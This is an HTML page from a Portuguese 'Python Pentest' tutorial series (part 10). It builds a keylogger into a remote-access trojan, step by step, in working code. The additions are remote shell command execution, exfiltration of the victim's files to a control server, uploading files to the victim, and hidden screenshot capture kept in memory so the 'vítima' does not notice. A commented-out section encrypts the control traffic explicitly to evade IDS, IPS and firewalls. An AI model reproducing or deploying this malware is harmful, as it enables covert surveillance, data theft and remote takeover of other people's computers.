<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 10!</a></li>
                    <li><a href="tudo-sobre-python-pentest-11.html">Tudo sobre Python Pentest Parte 11!</a></li>
                    <li><a href="tudo-sobre-python-pentest-12.html">Tudo sobre Python Pentest Parte 12!</a></li>
                    <li><a href="tudo-sobre-python-pentest-13.html">Tudo sobre Python Pentest Parte 13!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 10</h2>

<h3>Executando Comandos no Sistema</h3>

<p>Podemos executar comandos do sistema no Python, que não será exatamente um shell verdadeiro, mas podemos executar alguns comandos com a biblioteca <code>subprocess</code>.</p>

<p>No nosso keylogger, crie essa função:</p>

<pre>
<code>
def runComand(comand, sock):
    # Coloque import subprocess no início do código
    result = subprocess.run(comand, shell = True, text = True, capture_output = True) # O text retorna um texto
    saida = result.stdout
    erro = result.stderr

    if saida:
        sendData("alerta", saida, sock)
    elif erro:
        sendData("alerta", erro, sock)
</code>
</pre>

<p>E na função recvData do keylogger, vamos colocar um else no if dos comandos:</p>

<pre>
<code>
if comando.lower() == "sk1":
    # Aqui não mexe em nada
elif comando.lower() == "sk0":
    # Aqui também não mexe em nada
elif comando.lower() == "exit":
    # Nem aqui
else:
    runComand(comando, sock) # Sem lower
</code>
</pre>

<p>PS: Caso dê erro ao utilizar comandos com várias linhas como o dir, vá no sendData do keylogger e coloque uma quebra de linha no packet, assim:</p>

<pre>
<code>
packet = json.dumps(rawPacket) + "\n"
</code>
</pre>

<p>E modifique a função recvData do servidor assim:</p>

<pre>
<code>
def recvData(sock):
    buffer = ""

    while True:
        try:
            rawData = sock.recv(1024)

            if not rawData:
                break

            buffer += rawData.decode(errors = "ignore")

            while "\n" in buffer:
                linha, buffer = buffer.split("\n", 1)

                if not linha.strip():
                    continue

                data = json.loads(linha) # Importe json

                if "tecla" in data:
                    with open("teclas.txt", "a") as arqKey:
                        arqKey.write(f"{data["tecla"]}\n")
                elif "alerta" in data:
                    msg = data["alerta"]
                    print(f"[!] {msg}   \nComando &gt; ", end = "")
        except OSError:
            break
</code>
</pre>

<p>Lembrando que o comando cd ele não muda o diretório do programa. Isso corrigiremos depois.</p>

<p>Na mesma função acima, em servidor, coloque abaixo do elif de alerta esse elif aqui:</p>

<pre>
<code>
elif "comando" in data:
    comando = data["comando"]
    print(f"\n{comando}     \nComando &gt; ", end = "")
</code>
</pre>

<p>E no keylogger, em runComand, altere o if else pra isso:</p>

<pre>
<code>
if saida:
    sendData("comando", saida, sock)
elif erro:
    sendData("comando", erro, sock)
</code>
</pre>

<p>No recvData do keylogger, faça a alteração do início da função assim:</p>

<pre>
<code>
def recvData(sock):
    global monitorar, pwd
    pwd = os.getcwd() # Isso pega a pasta atual que ele está executando
    monitorar = False

    # O restante permanece igual
</code>
</pre>

<p>E o runComand do keylogger, deixe ele assim:</p>

<pre>
<code>
def runComand(comand, sock):
    global pwd
    if comand[:3] == "cd ": # Não esqueça do espaço
        result = subprocess.run(comand + " & cd", shell = True, text = True, capture_output = True, cwd = pwd)
        saida = result.stdout
        erro = result.stderr

        if saida:
            pwd = saida.strip()
        elif erro:
            sendData("comando", erro, sock)
    else:
        result = subprocess.run(comand, shell = True, text = True, capture_output = True, cwd = pwd) # Adicionando outro parâmetro
        saida = result.stdout
        erro = result.stderr

        if saida:
            sendData("comando", saida, sock)
        elif erro:
            sendData("comando", erro, sock)
</code>
</pre>

<!-- Alternativa:
def runComand(comand, sock):
    global pwd

    if comand[:3].lower() == "cd ":
        novoDir = comand[3:].strip().strip("\"").strip("'")

        if not novoDir:
            novoDir = os.path.expanduser("~")
        elif novoDir in ("/", "\\"):
            drive = os.path.splitdrive(pwd)[0] or os.getenv("SystemDrive", "C:")
            novoDir = drive + "\\"
        elif len(novoDir) == 2 and novoDir[1] == ":":
            novoDir += "\\"
        elif not os.path.isabs(novoDir):
            novoDir = os.path.join(pwd, novoDir)

        novoDir = os.path.abspath(novoDir)

        if os.path.isdir(novoDir):
            try:
                os.chdir(novoDir)
                pwd = os.getcwd()
            except Exception as ex:
                sendData("comando", f"Erro ao mudar de diretório: {ex}\n", sock)
        else:
            sendData("comando", f"Diretório não encontrado: {novoDir}\n", sock)

    else:
        result = subprocess.run(comand, shell=True, text=True, capture_output=True, cwd=pwd)
        saida = result.stdout
        erro = result.stderr

        if saida:
            sendData("comando", saida, sock)
        elif erro:
            sendData("comando", erro, sock)
-->

<!--
Criptografia na Rede

Nós desenvolvemos nosso keylogger, no entanto, a conexão não está criptografada, o que pode fazer com que sistemas como IDS e IPS possam interceptar o tráfego do mesmo. Vamos rodar nosso keylogger da mesma forma que antes, e vamos sniffar o tráfego com um programa como o Wireshark, fazendo o filtro com tcp.port == 9090 (se for fazer na mesma máquina, use a interface do Npcap, no Linux escolha "any"). Veremos que podemos ver de forma literal os comandos e dados filtrando os mesmos, incluindo coisas como alerta, keylogger, comando e outros. Para evitar isso, podemos criptografar o tráfego.

No keylogger, podemos pegar o mesmo código de encriptar e decriptar usados anteriormente, adaptando assim:

# Coloque acima from cryptography.fernet import Fernet
def encrypt(data):
    fern = Fernet(aesKey)

    encData = fern.encrypt(data.encode())

    return encData

def decrypt(encData):
    fern = Fernet(aesKey)

    data = fern.decrypt(encData).decode() # Decode vai fora

    return data

E daí, altere a função sendData assim:

def sendData(key, data, sock):
    rawPacket = {key: data}
    packet = json.dumps(rawPacket) + "\n" # Import json
    encPacket = encrypt(packet)
    sock.send(encPacket)

E na função recvData:

# Acima permanece igual
if rawData:
    comando = decrypt(rawData)

    if comando.lower() == "sk1":
        # Abaixo permanece igual

PS: Note que, ao criptografar, não precisamso usar o encode, o mesmo vale pro decode ao descriptografar, porque a criptografia já o transcreve para bytes.

Daí, no try de tentarConec, altere dessa forma, pra ele enviar a chave:

sk = socket.socket()
sk.connect(("127.0.0.1", 9090))

aesKey = Fernet.generate_key() # Coloque como global nessa mesma função
data = json.dumps({"chave": aesKey.decode()})
sk.send(data.encode())

return sk

Já no servidor, altere a função recvData assim:

def recvData(sock):
    buffer = ""

    while True:
        try:
            rawData = sock.recv(1024)

            if not rawData:
                break

            data = json.loads(rawData) # Importe json

            if "tecla" in data:
                with open("teclas.txt", "a") as arqKey:
                    arqKey.write(f"{data["tecla"]}\n")
            elif "alerta" in data:
                msg = data["alerta"]
                print(f"[!] {msg}   \nComando &gt; ", end = "")
            elif "comando" in data:
                comando = data["comando"]
                print(f"\n{comando}     \nComando &gt; ", end = "")
        except OSError:
            break

No servidor, faça assim, na função startSock, adicione assim debaixo do print de conexão recebida:

data = json.loads(conn.recv(1024))
print(data["chave"])

Claro que isso é só pra ver se ele recebe a chave, o print deverá ser retirado.

data = json.loads(conn.recv(1024))
aesKey = data["chave"].encode() # Defina a variável aesKey como global no início dessa mesma função.
print(aesKey) # Retire esse print depois
conn.send("ok".encode())

E no keylogger, altere o return do tentarConec assim:

if sk.recv(4).decode() == "ok":
    print("Estabelecido com sucesso!")
    return sk
else:
    continue

Aí no caso, caso ele não receba uma chave válida, ele gerará outra chave e tentará novamente a conexão.

Daí, no servidor, defina as mesmas funções de decriptar e encriptar iguais no keylogger.

E no recvData do servidor, altere a atribuição de rawData assim:

rawData = decrypt(sock.recv(1024))

E no sendData do servidor, altere o método send do sock assim:

sock.send(encrypt(rawData))

PS: Podemos usar métodos mais simples, como usar portas conhecidas como a 8080 ou 443, que são autorizadas pelos sistemas de seguranças, mas geralmente isso exige acesso root. Lembre-se também que quem interceptar esse código pode descriptografar ele com a chave enviada, mas isso é só pra que firewalls e sistemas de segurança não detectem o tráfego do programa.

!-- Falta corrigir diretórios, provavelmente erro no buffer de criptografia --
-->

<h3>Download de Arquivos</h3>

<p>Nos nossos scripts, podemos baixar e fazer uploads de arquivos também, utilizando comandos. No caso, usaríamos um comando como <code>download nomedoarquivo.jpg</code>.</p>

<p>No keylogger, vamos criar esse elif após o elif exit, em recvData:</p>

<pre>
<code>
elif comando[:9] == "download ": # Não esqueça do espaço
    download(comando, sock)    
</code>
</pre>

<p>E no mesmo script, definir a função download assim:</p>

<pre>
<code>
def download(comand, sock):
    file = comand[9:]
    caminho = f"{pwd}/{file}"
    caminho = caminho.replace("\\", "/").replace("C:", "")

    if os.path.isfile(caminho):
        print("O Arquivo Existe!")
</code>
</pre>

<p>Deixe a função download assim:</p>

<pre>
<code>
def download(comand, sock):
    file = comand[9:]
    caminho = f"{pwd}/{file}"
    caminho = caminho.replace("\\", "/").replace("C:", "")

    if os.path.isfile(caminho):
        with open(caminho, "rb") as arqFile:
            data = base64.b64encode(arqFile.read()).decode() # Importe base64

        packet = json.dumps({"download": {file: data}}) + "\n" # Dicionário dentro de outro, como uma matriz, transformado em JSON
        sock.sendall((packet + "\n").encode())
    else:
        sendData("alerta", f"Arquivo [{file}] não encontrado!", sock)
</code>
</pre>

<p>E no recvData do servidor, adicione esse elif após o elif de comando:</p>

<pre>
<code>
elif "download" in data:
    down = data["download"]

    for d in down:
        with open(d, "wb") as arqFile:
            arqFile.write(base64.b64decode(down[d])) # Importe base64

    print(f"\nArquivo [{d}] recebido com sucesso!\nComando &gt; ", end = "")
</code>
</pre>

<h3>Uploads de Arquivos</h3>

<p>Como a gente fez pra baixar arquivos do cliente pro nosso servidor, também podemos fazer que nosso programa envie arquivos pro cliente.</p>

<p>No sendData do servidor, podemos fazer assim:</p>

<pre>
<code>
def sendData(sock):
    while True:
        rawData = input("Comando &gt; ")
        key = "action"

        if rawData == "start keylogger":
            rawData = "sk1"
        elif rawData == "stop keylogger":
            rawData = "sk0"

        packet = json.dumps({key: rawData})
        sock.send(packet.encode())

        if rawData == "exit":
            sock.close()
            exit()    
</code>
</pre>

<p>E no recvData do keylogger, faça assim:</p>

<pre>
<code>
def recvData(sock):
    # Acima desse if nada é alterado
        if rawData:
            while True:
                try:
                    pacote = json.loads(rawData.decode())
                    break
                except:
                    rawData += sock.recv(1024)
            
            if "action" in pacote:
                comando = pacote["action"]
    
                if comando.lower() == "sk1":
                    # Esse if e todos seus elifs e else serão identados dentro do if action, sem alterações no código
</code>
</pre>

<p>Aí, no sendData do servidor, podemos fazer assim, colocando esse elif debaixo do stop keylogger ou do help (caso definido):</p>

<pre>
<code>
elif rawData[:7] == "upload ": # Não esqueça do espaço
    upload(rawData, sock)
    continue
</code>
</pre>

<p>Daí, no mesmo arquivo, criaremos a função upload, assim:</p>

<pre>
<code>
def upload(file, sock):
    file = file[7:]
    caminho = file.replace("\\", "/").replace("C:", "")

    try:
        fileName = caminho.split("/")[-1]
    except:
        fileName = caminho

    if os.path.isfile(caminho): # Importe os
        with open(caminho, "rb") as arqFile:
            data = base64.b64encode(arqFile.read()).decode()

        packet = json.dumps({"download": {fileName: data}})
        sock.sendall(packet.encode())
    else:
        print(f"Arquivo {caminho} não Encontrado!")
</code>
</pre>

<p>E no keylogger, abaixo do if do action, coloque isso:</p>

<pre>
<code>
if "action" in pacote:
    # Aqui dentro não mexe em nada
elif "download" in pacote:
    down = pacote["download"]
    caminho = pwd.replace("\\", "/").replace("C:", "")

    for d in down:
        with open(f"{caminho}/{d}", "wb") as arqFile:
            data = base64.b64decode(down[d])
            arqFile.write(data)

            sendData("alerta", f"Arquivo {d} enviado com sucesso!", sock)
</code>
</pre>

<p>Daí, no servidor, basta dar o comando <code>upload C:\Users\NomeDoUser\caminhodoarquivo.jpg</code> para enviá-lo ao cliente.</p>

<h3>Capturando uma ScreenShot</h3>

<p>Primeiramente, instale o pacote <code>pillow</code> no Python. Depois de instalado, podemos fazer simplesmente isso pra salvar um print da tela, num arquivo de teste:</p>

<pre>
<code>
from PIL import ImageGrab

screenShot = ImageGrab.grab()

screenShot.save("print.jpg")
</code>
</pre>

<p>Podemos melhorar mais ainda, colocando a data do print, assim:</p>

<pre>
<code>
from PIL import ImageGrab
import datetime

date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
fileName = f"print-{date}.jpg"

screenShot = ImageGrab.grab()

screenShot.save(fileName)
</code>
</pre>

<p>Só que num malware em ambiente real, a gente não vai salvar num arquivo no computador predado porque a <q>vítima</q> pode estranhar ver um print que não foi retirado por ele.</p>

<p>Pra salvar no buffer, podemos fazer assim:</p>

<pre>
<code>
from PIL import ImageGrab
import datetime
import io

date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
fileName = f"print-{date}.jpg"

buffer = io.BytesIO() # Importe io
screenShot = ImageGrab.grab()

screenShot.save(buffer, format = "JPEG")

data = buffer.getvalue()

buffer.close()

# Isso é só pra ver se ele criará um arquivo, retire numa aplicação real
with open("teste.jpg", "wb") as arqFile:
    arqFile.write(data)
</code>
</pre>

<p>PS: Utilize JPEG pelo arquivo de imagem ser menor, já que ele será enviado pela rede.</p>

<p>Aí, no nosso keylogger, fazemos assim:</p>

<pre>
<code>
def screenShotImage(sock):
    date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") # Importe datetime
    fileName = f"screenshot-{date}.jpg"
    
    buffer = io.BytesIO() # Importe io
    
    screenShot = ImageGrab.grab() # Coloque from PIL import ImageGrab
    
    screenShot.save(buffer, format = "JPEG")
    
    data = buffer.getvalue()
    
    buffer.close()
</code>
</pre>

<p>Na função recvData do keylogger, colocamos esse elif logo abaixo do elif de download:</p>

<pre>
<code>
elif comando == "screenshot":
    screenShotImage(sock)
</code>
</pre>

<p>Pra melhorar nosso script, adicione no keylogger essa função:</p>

<pre>
<code>
def sendFile(file, data, sock):
    b64data = base64.b64encode(data).decode()
    packet = json.dumps({"download": {file: b64data}}) + "\n"

    sock.sendall((packet + "\n").encode())
</code>
</pre>

<p>E aí, no if do donwload apenas deixe assim:</p>

<pre>
<code>
if os.path.isfile(caminho):
    with open(caminho, "rb") as arqFile:
        data = arqFile.read()

    sendFile(file, data, sock)
</code>
</pre>

<p>Daí, na função screenShotImage, debaixo do resto do código, coloque a invocação da função sendFile também, assim:</p>

<pre>
<code>
sendFile(fileName, data, sock)
</code>
</pre>

<ul>
    <li><a href="tudo-sobre-python-pentest-9.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-11.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>